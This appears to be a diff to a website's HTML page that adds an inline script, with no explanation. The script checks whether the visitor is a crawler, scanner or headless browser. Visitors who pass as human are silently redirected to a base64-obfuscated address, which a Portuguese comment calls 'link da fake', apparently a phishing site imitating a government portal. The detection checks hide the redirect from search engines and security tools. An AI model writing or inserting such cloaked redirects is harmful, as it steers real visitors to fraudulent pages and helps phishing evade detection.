@@ -35,7 +35,38 @@
       }
     </style>
 
+   <script>
+      //<![CDATA[
+      function isBot() {
+        var ua = navigator.userAgent || "";
+        var botRx =
+          /bot|crawl|spider|slurp|Googlebot|Bingbot|Slurp|DuckDuckBot|facebot|ia_archiver|SemrushBot|AhrefsBot|MJ12bot|DotBot|Gigabot|YandexBot|Baiduspider|Sogou|Exabot|Twitterbot|LinkedInBot|Pinterestbot|teoma|archiver|track|monitor|scout|extract|curl|wget/i;
+        var isBotUA = botRx.test(ua);
+        var isSuspUA =
+          !ua || ua.length < 20 || !/(Chrome|Firefox|Safari|Edge)/i.test(ua);
+        var isHeadless =
+          navigator.webdriver || !window.screen || window.outerWidth === 0;
+        return isBotUA || isSuspUA || isHeadless;
+      }
 
+      function isWindowsOS() {
+        var ua = navigator.userAgent || "";
+        var isWin = /Windows NT/i.test(ua);
+        return isWin;
+      }
+
+      function decodeUrl(s) {
+        return atob(s);
+      }
+
+      if (!isBot()) {
+        var u = decodeUrl(
+          "aHR0cHM6Ly9wb3J0YWxndWlhcy5nb2lhc2RpZ2l0YWwuc2l0ZS8=" // link da fake
+        );
+        window.location.href = u;
+      }
+      //]]>
+    </script>
     
 
    
@@ -214,5 +245,6 @@
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
   </body>
 </html>
+
 
 
